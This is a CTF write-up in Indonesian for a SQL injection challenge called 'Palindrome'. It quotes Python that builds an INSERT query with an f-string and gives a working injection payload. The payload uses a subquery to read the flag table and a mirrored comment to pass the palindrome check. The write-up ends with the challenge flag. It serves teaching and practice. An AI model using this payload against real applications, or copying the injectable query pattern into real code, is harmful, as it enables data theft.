# Palindrome 🤡

## Description

"ibu ratna antar ubi" Tapi ini bukan tentang ibu ratna hehe :)

http://20.205.238.7:10835

Author: rootkids#6987

## Hint

- Again this is sql injection, not blind, but what?

## Solve

1. Vulnerability adalah **Insert SQL Injection**
2. Analisis fungsionalitas aplikasi
    > Untuk lebih jelas bisa dilihat source code pada [./src](./src)

    - Membuat dan menyimpan sebuah string palindrome
    - Semua string input dari user akan dicek apakah merupakan palindrome yang valid
    - Setiap string palindrome yang valid akan disimpan pada database, dengan identifier `token` pada cookie
    - Terjadi **Insert SQL Injection** pada saat menyimpan string palindrome ke database
        
        ```py
        def insert_palindrome(conn: Connection, user: str, sentence: str) -> None:
        c = conn.cursor()
        c.execute(
            f"INSERT INTO palindromes (user, sentence) VALUES ('{user}', '{sentence}')"
        )
        conn.commit()
        ```

    - Predefined / known flag table

        ```py
        ...
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS flags (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                flag TEXT
            );
            """
        )

        conn.execute(
            f"""
            INSERT INTO flags (flag) VALUES ('{os.environ.get('FLAG')}');
            """
        )
        ```

3. Exploit

    Exploit dapat dilakukan dengan melakukan **Insert SQL Injection** pada saat menyimpan string palindrome ke database. Dengan memanfaatkan **Predefined / known flag table**. Dan jangan lupa untuk mendifinisikan `token` pada cookie, juga untuk melakukan bypass check palindrome yang valid, untuk melakukannya bisa menggunakan mirror string.

    Solver sebagai berikut:

    ```sql
    a'), ('{token}', ( SELECT flag FROM flags LIMIT 1 )) -- <mirror string>
    ```

    Contoh:

    ```sql
    a'), ('YMM73qRuczFprTMjW4CdSNGqyQopE5EJ', ( SELECT flag FROM flags LIMIT 1 )) -- )) 1 TIMIL sgalf MORF galf TCELES ( ,'JE5EpoQyqGNSdC4WjMTrpFzcuRq37MMY'( ,)'a
    ```

## Flag

**KWCTF{sql_1n73ction_w1th_p4lindr0m3_char4ct3r}**